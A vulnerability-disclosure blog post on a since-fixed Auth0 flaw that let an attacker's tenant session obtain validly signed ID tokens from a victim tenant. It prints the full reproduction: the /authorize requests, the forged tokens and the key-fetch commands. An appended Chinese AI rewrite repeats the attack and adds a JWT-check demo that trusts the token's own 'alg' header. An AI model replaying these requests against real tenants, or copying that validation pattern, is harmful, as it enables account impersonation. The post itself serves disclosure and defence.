- ID tokens are JWTs. Access tokens can be JWTs but may also be a random string.
- ID tokens should never be sent to an API. Access tokens should never be read by the client.

And Microsoft says:

ID tokens shouldn't be used for authorization purposes. Access tokens are used for authorization. The claims provided by ID tokens can be used for UX inside your application, as keys in a database, and providing access to the client application. 

Auth0 themselves also make this distinction on several pages in their documentation. A good overview is presented in their article Access Tokens. They use access tokens both in the form of an opaque string, which cannot be validated without calling Auth0’s management API, and in the JWT form, where all information needed for most authorization decisions can be included. 

When access tokens are on the JWT format they can look very similar to ID tokens.  

The vulnerability described in this blog post allowed an attacker to have Auth0 to sign a JWT ID token containing a victim's user address. I never checked JWT-based access tokens when this vulnerability was present in Auth0’s systems. At Sentor I have come across many applications which verify JWT ID tokens and trust their contents when making authorization decisions.

For reference, this is how the claims in a typical Auth0 ID token might look like: 

{ 
  "nickname": "ts21+auth0-trial2-user1", 
  "name": "ts21+auth0-trial2-user1@sentorlab.se", 
  "picture": "https://s.gravatar.com/avatar/646d0458d3266abaeceaf45ec20376c1?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fts.png", 
  "updated_at": "2023-07-21T10:57:53.472Z", 
  "email": "ts21+auth0-trial2-user1@sentorlab.se", 
  "email_verified": false, 
  "iss": "https://dev-j34aiglnx8fz83sc.us.auth0.com/", 
  "aud": "OliFlQ76DzsMdxbO2nZAm27ozKZosJk4", 
  "iat": 1689937798, 
  "exp": 1689973798, 
  "sub": "auth0|64b97a87b6c808c6f9ccbb3c", 
  "sid": "GIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W", 
  "nonce": "whatever" 
}
Finding authentication bypass in Auth0
When I was working on a Proof of Concept attack on the previously disclosed session fixation vulnerability, I created two Auth0 trial tenants. When repeating the attack I stumbled upon this much worse vulnerability – authentication bypass. 

Below is the report I sent them, but with a few edits on spelling, formatting and some clarifications. Screenshots of Auth0 configuration pages are included in the blog post to make it easier to follow, especially for people not having set up Auth0 tenants themselves. 

Irrelevant data in HTTP requests and responses has been replaced with [...] and JSON data has been prettified for readability. 

Hi! 

My company does not allow bug bounty programs, so I cannot use the Bugcrowd form to report this. 

While reproducing the session fixation vulnerability which I recently reported, I stumbled upon a much worse problem. Please confirm both when you have read this (successful decryption) and when you have tried to reproduce. 

The technical details are included below. The Vulnerability Rating Taxonomy (VRT) classification is according to Bugcrowd’s definitions.

Target: customer.auth0.com 
VRT category: Broken Authentication and Session Management 
VRT subcategory: Authentication Bypass 
Predicted severity: P1 Critical
I wish to know if you consider my finding a security vulnerability, whether you intend to patch it and if that can be done within 90 days.

This bug is subject to a 90-day disclosure deadline. After 90 days elapses, the bug report will become visible to the public.

Overview
I have managed to get one tenant to issue a JWT for a user which only exists in another tenant. All "public" applications such as Single Page Applications (SPAs), which have public /authorize endpoints, are probably vulnerable. Below I have proven the problem between two US-4 tenants in the preview environment. Currently I don't know if the attacker tenant and the victim tenant must be in the same locality, or if the same region (US in this case) is enough. The problem seems to not be reproducible between regions at least (I tried between EU-2 and US-4 with no success). It's also currently not known if the problem exists at all in the production environment. If the tenant test21-sentorlab.eu.auth0.com was successfully "migrated" to the production environment after I upgraded it to the "B2C - Essentials" subscription yesterday (2023-JUL-21), I have reproduced the problem between production and preview environments within a locality (EU-2) as well. 

The vulnerability exists both after logging in using Universal Login and after using the Cross Origin Authentication (/co/authenticate) endpoint. 

With the permission of <redacted customer>, I have tried getting a JWT issued for their login-stage.<redacted>.<tld> tenant (<redacted>.edge.tenants.eu.auth0.com) but failed. If their tenant is located in the EU-1 locality, that could explain the failure. I have created several EU tenants, but all ended up in EU-2. <Redacted person at customer> is on vacation so I don't currently know which locality their tenant lives in, and I haven't found a way to determine that as an attacker, either.

Probable root cause
My analysis of the root cause says that, if a session (sid) has any tenant information at all in it, the /authorize endpoint fails to validate it before issuing tokens. After successfully authenticating as a valid user in an attacker tenant A, the auth0 cookie can be sent to the /authorize endpoint of a victim tenant B and that tenant will happily sign a JWT with its correct key just as if a user with the same email address would have existed in that tenant. An attacker needs to: 

- Know the domain of a victim tenant
- Know a client ID in the victim tenant (public information in most applications but especially for SPAs)
- Have their own tenant in the same locality
- Know the email address of a victim user, in case a particular victim user needs to be impersonated
- Create a user representing the victim (by email address) in the attacker tenant

Restrictions
Only a Username-Password-Authentication connection has been tested. 

I am aware of your recommendation to validate the nonce claim in JWTs, but I deem that as unfeasible when for instance having an SPA for logging in and then validating the JWTs in an API backend. I don't think that many customers will have their SPA to either ask their API for a nonce or report a nonce to their API before sending the nonce to the Auth0 login flow. This would have been needed for their API to validate the nonce claim in the incoming JWTs later. 

If a victim application is validating the sub (subject) claim, it will not accept the forged JWT, because the subject value will be that of the attacker user in the attacker tenant. 

Also, if the application is checking that the email_verified claim is true, it will not accept the forged JWT unless the attacker manages to fool the victim into verifying the account in the victim tenant. 

Well, that last assumption did not hold. When writing this blog post I discovered that you could set an email address as verified yourself. Your tenant – your choice. You are the admin and manage your own users, after all.

set email as verified

I also noticed that you could disable the sending of (enabled by default) email address verification email that is otherwise sent as soon as you add a new user to your Username-Password-Authentication database by first changing from the default Auth0 email provider and then disabling the Verification Email (using Link) email template: 






That way the victim user won’t get any warning that you are going to impersonate them. 

How to reproduce
I have reproduced the problem between two different trial subscriptions both having a tenant each in the US-4 locality. Note that when this blog post was published, the vulnerability could not be reproduced anymore. 

VICTIM TENANT:
Trial 1: ts21+auth-trial@sentorlab.se
Domain: dev-nn41qmsm56z6ffw2.us.auth0.com
Client ID: Vz0wYTtjdWPbQ47A2xLtoHtZg5qvv3W7
User: ts21+auth0-user1@sentorlab.se 
ATTACKER TENANT:
Trial 2: ts21+auth-trial2@sentorlab.se
Domain: dev-j34aiglnx8fz83sc.us.auth0.com
Client ID: POX2AdY3AI1lxK1sGSXqDptHAEUnTBgl
User: ts21+auth0-trial2-user1@sentorlab.se
After creating a user with the victim’s email address in the attacker tenant and then logging in to the attacker tenant, a request to gain a JWT in the correct (attacker) tenant looks like this: 

Request 

GET /authorize?client_id=OliFlQ76DzsMdxbO2nZAm27ozKZosJk4&nonce=whatever&response_type=id_token&prompt=none&redirect_uri=https://test21.sentorlab.se/&scope=openid+profile+email HTTP/2
Host: dev-j34aiglnx8fz83sc.us.auth0.com
Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs
Response 

HTTP/2 302 Found
Date: Fri, 21 Jul 2023 11:09:58 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 1219
Location: https://test21.sentorlab.se/#id_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImpnY3l4ekRENHFmOFp3Qm9saFNaSCJ9.eyJuaWNrbmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxIiwibmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsInBpY3R1cmUiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci82NDZkMDQ1OGQzMjY2YWJhZWNlYWY0NWVjMjAzNzZjMT9zPTQ4MCZyPXBnJmQ9aHR0cHMlM0ElMkYlMkZjZG4uYXV0aDAuY29tJTJGYXZhdGFycyUyRnRzLnBuZyIsInVwZGF0ZWRfYXQiOiIyMDIzLTA3LTIxVDEwOjU3OjUzLjQ3MloiLCJlbWFpbCI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9kZXYtajM0YWlnbG54OGZ6ODNzYy51cy5hdXRoMC5jb20vIiwiYXVkIjoiT2xpRmxRNzZEenNNZHhiTzJuWkFtMjdvektab3NKazQiLCJpYXQiOjE2ODk5Mzc3OTgsImV4cCI6MTY4OTk3Mzc5OCwic3ViIjoiYXV0aDB8NjRiOTdhODdiNmM4MDhjNmY5Y2NiYjNjIiwic2lkIjoiR0laTGZ4YUFhM0ZpeWVpdzItT2dvcXZzWm5XY0hHNFciLCJub25jZSI6IndoYXRldmVyIn0.XN8awGcPIiK3gYKV44Zrl3z2q87TNlQ6BWZMdo6fqS3bT6WB0rqtUwN_qaToRU7fGN_4C3FpjphJaaKTIOvONQAICxJMRnlPd9JY4YXB-RtG28urIv0X-b85RwJXFGtPxqbKyVY8cifNrIeyK3UslWrZBiCtI03Q0fVnvjU_Wv4_-YG3qV_hf8IUV4pgKSqc2SVt7qi1YcZ0D9pyQI4km0Dm9NKrQYHPT-TwOMKf2jo0-S_S_3TXq7L7_jfaX-fPXZNmmHhQDQhBcxTedBq81iiiua01f3w80kf3SATCNsLq1vhcXqCBjL6ObGOjqF72S6hke-7nBhOwyRXxNXMMSg
[...]
Set-Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs; Path=/; Expires=Mon, 24 Jul 2023 11:09:58 GMT; HttpOnly; Secure; SameSite=None
[...]
Found. Redirecting to https://test21.sentorlab.se/#id_token=[...]
Decoded JWT 

(You can use this jwt.io link to verify it, and as long as my trial subscription is alive, also verify the signature.)

{ 
  "alg": "RS256", 
  "typ": "JWT", 
  "kid": "jgcyxzDD4qf8ZwBolhSZH" 
} 
{ 
  "nickname": "ts21+auth0-trial2-user1", 
  "name": "ts21+auth0-trial2-user1@sentorlab.se",
  "picture": "https://s.gravatar.com/avatar/646d0458d3266abaeceaf45ec20376c1?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fts.png", 
  "updated_at": "2023-07-21T10:57:53.472Z", 
  "email": "ts21+auth0-trial2-user1@sentorlab.se", 
  "email_verified": false,
  "iss": "https://dev-j34aiglnx8fz83sc.us.auth0.com/", 
  "aud": "OliFlQ76DzsMdxbO2nZAm27ozKZosJk4",
  "iat": 1689937798,
  "exp": 1689973798,
  "sub": "auth0|64b97a87b6c808c6f9ccbb3c",
  "sid": "GIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W",
  "nonce": "whatever" 
}
The attacker then repeats the /authorize request but replaces the domain and the client ID to the values of the victim tenant: 

Request 

GET /authorize?client_id=Vz0wYTtjdWPbQ47A2xLtoHtZg5qvv3W7&nonce=whatever&response_type=id_token&prompt=none&redirect_uri=https://test21.sentorlab.se/&scope=openid+profile+email HTTP/2
Host: dev-nn41qmsm56z6ffw2.us.auth0.com
Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs
Response 

HTTP/2 302 Found
Date: Fri, 21 Jul 2023 11:16:57 GMT 
Content-Type: text/plain; charset=utf-8 
Content-Length: 1219
Location: https://test21.sentorlab.se/#id_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjhKYzVZR1cwbXR3MlZSMWU4S3BPcCJ9.eyJuaWNrbmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxIiwibmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsInBpY3R1cmUiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci82NDZkMDQ1OGQzMjY2YWJhZWNlYWY0NWVjMjAzNzZjMT9zPTQ4MCZyPXBnJmQ9aHR0cHMlM0ElMkYlMkZjZG4uYXV0aDAuY29tJTJGYXZhdGFycyUyRnRzLnBuZyIsInVwZGF0ZWRfYXQiOiIyMDIzLTA3LTIxVDEwOjU3OjUzLjQ3MloiLCJlbWFpbCI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9kZXYtbm40MXFtc201Nno2ZmZ3Mi51cy5hdXRoMC5jb20vIiwiYXVkIjoiVnowd1lUdGpkV1BiUTQ3QTJ4THRvSHRaZzVxdnYzVzciLCJpYXQiOjE2ODk5MzgyMTcsImV4cCI6MTY4OTk3NDIxNywic3ViIjoiYXV0aDB8NjRiOTdhODdiNmM4MDhjNmY5Y2NiYjNjIiwic2lkIjoiR0laTGZ4YUFhM0ZpeWVpdzItT2dvcXZzWm5XY0hHNFciLCJub25jZSI6IndoYXRldmVyIn0.SyK3g5k9XBmIyfOfgpjsZUjbp8Z9S7FbmyG9ZKrdvjWe0C0ZzDFRQGWTmapX5tqWGV3Wy8ub1lH00U-e8PPr---SNPhzIAysH5Of_lDPUNmOsu9Umxc6WrUGnd0I92R3Gvhsy7EmDENoU7bN0mDmxsh0vp4Ccbn9nYw6OU4fMRvyFJU2b4DI9QA94FoEZTWi_vSav0pYW7BjGrh--jPXvApTJscnDJbFrIH2KPglm1BIkK1_s3NKkeY3kATXWo8XvjgadNRqwHJvDA8WO0p49yUOCy8B4d2J2w0Bhz56t1aOfIVXf1WpYqWRS5q_hqTTSJpqRrwQKKgRgySw6ZKy5w
[...]
Set-Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs; Path=/; Expires=Mon, 24 Jul 2023 11:16:57 GMT; HttpOnly; Secure; SameSite=None 
[...] 

Found. Redirecting to https://test21.sentorlab.se/#id_token=[...]
Decoded JWT 

(You can use this jwt.io link to decode it, and as long as my trial subscription is alive, also verify the signature.) 

{
  "alg": "RS256", 
  "typ": "JWT", 
  "kid": "8Jc5YGW0mtw2VR1e8KpOp" 
} 
{ 
  "nickname": "ts21+auth0-trial2-user1", 
  "name": "ts21+auth0-trial2-user1@sentorlab.se", 
  "picture": "https://s.gravatar.com/avatar/646d0458d3266abaeceaf45ec20376c1?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fts.png", 
  "updated_at": "2023-07-21T10:57:53.472Z", 
  "email": "ts21+auth0-trial2-user1@sentorlab.se", 
  "email_verified": false, 
  "iss": "https://dev-nn41qmsm56z6ffw2.us.auth0.com/", 
  "aud": "Vz0wYTtjdWPbQ47A2xLtoHtZg5qvv3W7", 
  "iat": 1689938217, 
  "exp": 1689974217,
  "sub": "auth0|64b97a87b6c808c6f9ccbb3c", 
  "sid": "GIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W",
  "nonce": "whatever" 
}
Note that a user with that email address does not exist in the victim tenant. 

For the sake of this blog post and to prove the vulnerability after my trial subscriptions have ended and their tenants been deleted, below are the public parts of the Auth0 generated asymmetric keys used to sign the two JWTs above. Well, I could of course have generated the keys myself and faked the whole thing, but I hope Auth0 won’t claim that. Attaching the signing certificates will not help since they are self-signed (root CAs – Certificate Authorities). So, make sure to download the jwks.json files yourself if they are still online when you read this. :) 

$ curl --silent https://dev-j34aiglnx8fz83sc.us.auth0.com/.well-known/jwks.json | jq .keys[0] 
{ 
  "kty": "RSA", 
  "use": "sig", 
  "n": "vdi2IuC4mkcbiSjc3tz6zs2KwFRryQvojiBV5oRGORNI9ohLdslZx-_GTMeVEJw0Rc3efSqnJBmMzvBuSFgkh_EaqsyzrX3lV827F-KdRSdXFI1jV9OcQzsd2xK5ggZDv8V8FKQHF4cN86g7pcpsSfvFPY1BvNmEuOD-HinEnjdqr0QHAmFK-jOs1RMZAs89l1u4DCfDzMR0zVEqrg8lPMi7GDmHv7pOYMJUgiKZPvS-FqBhJPtpxmbj8IthfN3gA3RahjJGQPbciOSf-MbUnN2k9uLp0-mDA382UTstvLgRpP3PONCp4fbexk2v05UjOQ8s0bTNqDu5OiyKT2PpGQ", 
  "e": "AQAB", 
  "kid": "jgcyxzDD4qf8ZwBolhSZH", 
  "x5t": "xmHHlJN0ainEbNbjkrYph28HXJM", 
  "x5c": [ 
  "MIIDHTCCAgWgAwIBAgIJN6uOgvf7KnClMA0GCSqGSIb3DQEBCwUAMCwxKjAoBgNVBAMTIWRldi1qMzRhaWdsbng4Zno4M3NjLnVzLmF1dGgwLmNvbTAeFw0yMzA3MjAxODA0NDVaFw0zNzAzMjgxODA0NDVaMCwxKjAoBgNVBAMTIWRldi1qMzRhaWdsbng4Zno4M3NjLnVzLmF1dGgwLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL3YtiLguJpHG4ko3N7c+s7NisBUa8kL6I4gVeaERjkTSPaIS3bJWcfvxkzHlRCcNEXN3n0qpyQZjM7wbkhYJIfxGqrMs6195VfNuxfinUUnVxSNY1fTnEM7HdsSuYIGQ7/FfBSkBxeHDfOoO6XKbEn7xT2NQbzZhLjg/h4pxJ43aq9EBwJhSvozrNUTGQLPPZdbuAwnw8zEdM1RKq4PJTzIuxg5h7+6TmDCVIIimT70vhagYST7acZm4/CLYXzd4AN0WoYyRkD23Ijkn/jG1JzdpPbi6dPpgwN/NlE7Lby4EaT9zzjQqeH23sZNr9OVIzkPLNG0zag7uTosik9j6RkCAwEAAaNCMEAwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUhUgX1Mx8SkubU5lJKWLc1VscHQ8wDgYDVR0PAQH/BAQDAgKEMA0GCSqGSIb3DQEBCwUAA4IBAQAKysua0zBQy7lo0Jyvnjto8mgxsL8EMThteRKOOeNEtPPASl1smwyH8c3eSI6i237gmw+hWL1DtEYFyp7lkNFzmjV/yAzUvjwFbwE4E7t9fDbdoS7m3QZmf+Kb5QI1hDvGA0OQ5oxMi2qbWGCMb+mPppUbc1mWaIkgdu0LSFhPtl1EI0vT1UUHm9/U/YQ+sR08Sia6eXgcHZkVJMtSqg5VYirOmd64cYQHPCeQ5SvXjb3sKEJvCLvJAbzPrLcjFMOdtb8DSZL0kaKKIHMGlylrvNET/g269ga5h4r4+R0IqdKpKl+NM6pcrRzATivRFBhKuVhx0wo5oUeKStmML869" 
  ], 
  "alg": "RS256" 
}
$ curl --silent https://dev-nn41qmsm56z6ffw2.us.auth0.com/.well-known/jwks.json | jq .keys[0] 
{ 
  "kty": "RSA", 
  "use": "sig", 
  "n": "vhgYm8bLxWtU2MiYqBbbpgu9-B0jZW0BNNPSFbIbndYB3dHISxCSfwLETjDaJzQoEvWdoU-UvKF9SGcJ9H8NYGl4Bz45vIhToJbx1oVVZXXUpuM2cmARr3eV-_xZpEj4JjuDzo6jAMe-2wt1iXEKiraUAqzSiVucAKnU31fKnM5R5x4BFjquGek9Bh-OXIreBe_Pxpr8--mJJI1T7z4ki6-mgefihSvJNJcCDB5iGpNl6mMRWzBazKEsf_3bz2IelXi0WfigGqFoVY7-XPQrYHR-doFxg9EvIh6q4uvln02sZt0NATGf_qIV7bs108ZN5bzrAl0NTl3-coONlO0SkQ", 
  "e": "AQAB", 
  "kid": "8Jc5YGW0mtw2VR1e8KpOp", 
  "x5t": "_pYx_hdrb7lY3aVTQBQfVi2UNNY", 
  "x5c": [ 
    "MIIDHTCCAgWgAwIBAgIJIJL/syBP6bA7MA0GCSqGSIb3DQEBCwUAMCwxKjAoBgNVBAMTIWRldi1ubjQxcW1zbTU2ejZmZncyLnVzLmF1dGgwLmNvbTAeFw0yMzA2MjgwOTMwNTdaFw0zNzAzMDYwOTMwNTdaMCwxKjAoBgNVBAMTIWRldi1ubjQxcW1zbTU2ejZmZncyLnVzLmF1dGgwLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4YGJvGy8VrVNjImKgW26YLvfgdI2VtATTT0hWyG53WAd3RyEsQkn8CxE4w2ic0KBL1naFPlLyhfUhnCfR/DWBpeAc+ObyIU6CW8daFVWV11KbjNnJgEa93lfv8WaRI+CY7g86OowDHvtsLdYlxCoq2lAKs0olbnACp1N9XypzOUeceARY6rhnpPQYfjlyK3gXvz8aa/PvpiSSNU+8+JIuvpoHn4oUryTSXAgweYhqTZepjEVswWsyhLH/9289iHpV4tFn4oBqhaFWO/lz0K2B0fnaBcYPRLyIequLr5Z9NrGbdDQExn/6iFe27NdPGTeW86wJdDU5d/nKDjZTtEpECAwEAAaNCMEAwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUy+FuNyPaTiD86DJDHpabBCRuKbwwDgYDVR0PAQH/BAQDAgKEMA0GCSqGSIb3DQEBCwUAA4IBAQCfRBEuUgtgAPACbKPjnEuZaNmjAtoDoS/6aFPlAq1ekLQjJAnqku3Qeda0cVAzEXwGE+Kv8Wx/+V2qKz1KtSuSqgB4PdVJejZQR/2Pl3rfmJITiRwv+NQhT7fH4+Q85QHit2zLH0BDNhlJy0ce+T+iZ/CEDVwlLdeY/OWpUBbzqBji9uls4IUSl8af59E3EfXl73UnZkMgxeTsinupxIRK0Vom92FErCBpwndWl5iOgZhLXQf89qVZ77TSiDjdKAUiKMYeTyrdvwdHKlIJP+PSNMP0I0GlPLaQrDqOuctuFtnSuBNn45lKNivTDi61uzOzwFowjId7eAG3xCLPXmaX" 
  ], 
  "alg": "RS256"
}
Recommendations
The following recommendation to mitigate the vulnerability was sent to Auth0: 

- Always check which tenant and client ID a session is valid for before trusting any data in it.

Similarities with “nOAuth”
Researchers at Descope discovered the so-called nOAuth vulnerability and published a blog post the 20th of June 2023 called nOAuth: How Microsoft OAuth Misconfiguration Can Lead to Full Account Takeover. That vulnerability was in the combination of Microsoft Entra ID (formerly Azure AD) and how some application developers trusted the email claim of Microsoft issued JWTs. Exploiting that vulnerability also involved an attacker-controlled tenant and allowed impersonation of users. 

The day before publication of this blog post I went through Okta’s different blog platforms (they have many) and found the article Saying “No Thanks” to nOAuth, published the 5th of August 2023. It’s a response to the nOAuth vulnerability and ends with how Okta’s both platforms are different – both Workforce Identity Cloud but also Customer Identity Cloud (Auth0). Given that Okta/Auth0 knew about my vulnerability report at the time, and maybe they also already had mitigated it, a few citations are a bit ironic in my opinion: 

By contrast, the Okta Workforce Identity Cloud (WIC) is architected around per-tenant (“Okta Org”) federation, and it's up to the Org administrator to determine what identifiers to support. Our tenant boundary is strict: an org administrator can't impersonate users in a different org. 

Is it careful wording there? They don’t say anything about Customer Identity Cloud. 

While Okta Customer Identity offers the option to allow unverified emails to be used as part of Self-Service Registration (see screenshot below); the blast radius is again squarely within the tenant itself. 

Well, they might just have mitigated such a vulnerability... 

Furthermore, the issuer of Microsoft tokens is "MicrosoftOnline", whereas for Okta it is your-org.okta.com. 

In this vulnerability it does not have any difference since it’s possible to have that issuer to issue tokens with attacker-controlled information and signed with the correct keys of the issuer. But it’s good to have several layers of security! 

Previous Auth0 authentication bypass vulnerabilities 
In 2017, the company Cinta Infinita found and reported an authentication bypass vulnerability in the Auth0 platform, which they disclosed publicly a year later in their blog post Knocking Down the Big Door – How We Bypassed the Auth0 Authentication. On the same day, Auth0 published the security bulletin CVE-2018-6873: Security Vulnerability in the Auth0 Authentication Service and their Chief Security Officer (CSO) wrote about the whole process in the blog post Managing and Mitigating Security Vulnerabilities at Auth0. 

Those who are familiar with JWT security know of the “none algorithm attack”. Auth0 apparently blocklisted “alg”:”none”, but did that in a case sensitive manner. Setting “alg”:”nonE” in the JWT header completely bypassed the signature check, which Insomnia Security (now CyberCX) found out in 2019. See their blog post JSON Web Token Validation Bypass in Auth0 Authentication API and Auth0’s response in their blog post Insomnia Security Disclosure. 

Auth0 also had a “algorithm confusion” vulnerability when validating JWT signatures. See their security bulletin CVE-2022-23539, CVE-2022-23541, CVE-2022-23540: Security Update for jsonwebtoken or the guest blog post by Tim McLean who found the problem: Critical vulnerabilities in JSON Web Token libraries. 

There have been several other JWT validation vulnerabilities in Auth0 libraries in the past: 

- CVE-2020-15084: Security Update for express-jwt Library
- CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT 
- CVE-2019-13483: Security Vulnerability in Passport-SharePoint 
- CVE-2020-15240: Security Update for omniauth-auth0 JWT Validation

And one SAML (Security Assertion Markup Language) validation vulnerability as well:

- CVE-2022-23505: Security Update for passport-wsfed-saml2 Library

---

**Assistant:** 好的，以下是用更易于理解的方式，对您提供的内容进行重新描述，并加入实际应用例子和代码示例，希望能帮助您更好地理解。
## Auth0 认证绕过漏洞：简单讲解与实际应用
### 背景
在 Web 应用安全中，身份验证（Authentication）和授权（Authorization）至关重要。通常，开发者会选择使用成熟的身份管理服务，例如 Auth0，而不是自己从零开始编写，以避免常见的安全漏洞。Auth0 是一家提供身份验证和授权服务的公司，被 Okta 收购。
### 漏洞描述
Laban Sköllermark 在 Auth0 中发现了一个严重的安全漏洞：在特定情况下，攻击者只需知道受害者的电子邮件地址，就可以冒充 Auth0 客户系统中的任何用户。这意味着攻击者可以绕过身份验证，直接以受害者的身份登录并访问其帐户。
### 漏洞原理
该漏洞的根本原因是 Auth0 在某些情况下，没有正确验证会话（Session）的租户（Tenant）信息。攻击者首先在自己的 Auth0 租户中创建一个与受害者电子邮件地址相同的用户，然后利用已登录的会话信息，向受害者租户的授权端点请求 JWT（JSON Web Token）。由于 Auth0 没有充分验证会话信息，它会错误地为攻击者颁发一个包含受害者信息的 JWT。
### 技术细节
- **JWT（JSON Web Token）：** 一种用于在各方之间安全地传输信息的开放标准（RFC 7519）。JWT 通常用于身份验证和授权。
- **ID Token vs. Access Token：**
*ID Token*：用于验证用户身份，通常是 JWT 格式，不应该用于授权。
- *Access Token*：用于授权，允许客户端代表用户访问受保护的资源。Access Token 可以是 JWT 格式，也可以是随机字符串。
### 重现步骤 (Vulnerability existed before Auth0 fixed it)
假设我们有两个 Auth0 租户：
- **攻击者租户：** `attacker.auth0.com`
- **受害者租户：** `victim.auth0.com`
- ### 在攻击者租户中创建用户： 使用受害者的电子邮件地址 (`victim@example.com`) 在攻击者租户中创建一个用户。
- ### 登录攻击者租户： 使用攻击者租户中创建的 `victim@example.com` 用户登录。
- ### 获取 JWT：
首先，向攻击者租户的 `/authorize` 端点发送请求，获取一个 JWT。
- 然后，修改请求，将域名和客户端 ID 替换为受害者租户的值，再次发送请求。
- 如果 Auth0 没有正确验证会话信息，它会为攻击者颁发一个包含受害者信息的 JWT。
### HTTP 请求示例
- ### 攻击者租户请求：
textGET /authorize?client_id=ATTACKER_CLIENT_ID&amp;nonce=whatever&amp;response_type=id_token&amp;redirect_uri=https://attacker.com&amp;scope=openid profile email HTTP/1.1
Host: attacker.auth0.com
Cookie: auth0=SESSION_COOKIE
- ### 受害者租户请求（利用攻击者会话）：
textGET /authorize?client_id=VICTIM_CLIENT_ID&amp;nonce=whatever&amp;response_type=id_token&amp;redirect_uri=https://attacker.com&amp;scope=openid profile email HTTP/1.1
Host: victim.auth0.com
Cookie: auth0=SESSION_COOKIE  // 使用攻击者租户的 Cookie
### 实际应用例子
假设有一个在线银行应用，使用 Auth0 进行身份验证。攻击者利用此漏洞冒充受害者登录银行应用，可能导致资金盗窃或其他金融犯罪。
### Demo 代码 (模拟验证 JWT)
以下是一个简单的 Python 代码示例，用于验证 JWT：
pythonimport jwt
import requests
def verify_jwt(token, jwks_url, audience, issuer):
"""
验证 JWT 的有效性。
Args:
token (str): 要验证的 JWT 字符串。
jwks_url (str): 包含 JWKS（JSON Web Key Set）的 URL。
audience (str): JWT 的 audience（aud）声明，表示 JWT 的接收者。
issuer (str): JWT 的 issuer（iss）声明，表示 JWT 的颁发者。
Returns:
dict: 如果 JWT 有效，则返回解码后的 JWT payload；否则返回 None。
"""
try:
# 1. 从 JWKS URL 获取 JWKS
jwks_response = requests.get(jwks_url)
jwks_response.raise_for_status()  # 检查 HTTP 错误
jwks = jwks_response.json()
# 2. 从 JWT 头部获取 kid（Key ID）
header = jwt.get_unverified_header(token)
kid = header.get('kid')
# 3. 在 JWKS 中查找匹配的密钥
key = None
for k in jwks['keys']:
if k['kid'] == kid:
key = k
break
if not key:
print("未找到匹配的密钥")
return None
# 4. 使用密钥验证 JWT 签名
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(key)
payload = jwt.decode(
token,
public_key,
algorithms=[header['alg']],
audience=audience,
issuer=issuer
)
return payload
except jwt.exceptions.InvalidTokenError as e:
print(f"JWT 验证失败: {e}")
return None
except requests.exceptions.RequestException as e:
print(f"获取 JWKS 失败: {e}")
return None
except Exception as e:
print(f"发生未知错误: {e}")
return None
# 示例用法
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1RPT0ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"  # 替换为你的 JWT
jwks_url = "https://your-auth0-domain.com/.well-known/jwks.json"  # 替换为你的 Auth0 JWKS URL
audience = "your-api-identifier"  # 替换为你的 API 标识符
issuer = "https://your-auth0-domain.com/"  # 替换为你的 Auth0 域名
payload = verify_jwt(token, jwks_url, audience, issuer)
if payload:
print("JWT 验证成功:")
print(payload)
else:
print("JWT 验证失败")
### 防范措施
- **始终验证租户信息：** 在验证会话信息时，务必检查会话所属的租户和客户端 ID。
- **使用 Access Token 进行授权：** 避免使用 ID Token 进行授权，而应使用 Access Token。
- **实施多因素身份验证（MFA）：** 即使攻击者成功绕过身份验证，MFA 也可以提供额外的安全保护。
- **定期审查和更新安全措施：** 及时关注 Auth0 官方的安全公告，并采取相应的防范措施。
### 总结
Auth0 的这个认证绕过漏洞是一个严重的安全问题，可能导致严重的后果。通过了解漏洞的原理和防范措施，开发者可以更好地保护其 Web 应用的安全。虽然 Auth0 已经修复了此漏洞，但我们仍然需要保持警惕，并不断学习新的安全知识，以应对不断变化的安全威胁。